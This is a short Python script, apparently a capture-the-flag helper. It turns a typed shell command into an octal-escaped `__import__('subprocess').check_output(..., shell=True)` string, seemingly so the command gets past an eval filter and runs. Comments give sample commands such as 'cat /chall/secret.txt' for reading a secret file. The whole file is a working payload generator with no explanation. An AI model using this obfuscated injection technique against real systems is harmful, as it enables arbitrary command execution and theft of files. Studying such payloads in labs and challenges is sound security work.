def ascii2octalstring(source: str) -> str:
    octal = ""
    for c in source:
            octal += "\\"
            octrep = oct(ord(c))[2:]  # octal numbers are prepended by a zero,
                                    # but since this will be a string not a
                                    # number we don't want that.
            octrep = octrep.zfill(3)  # pad with preceeding 0s
            octal += octrep
    
    return octal

if __name__ == '__main__':
    while True:
        cmd = input('cmd? > ')
        # ls
        # cat /chall/secret.txt
        text = f'__import__("subprocess").check_output("{cmd}", shell=True)'
        print(text)
        result = ascii2octalstring(text)
        print(result)
        # a = eval(result.encode().decode('unicode_escape'))
        # print(a)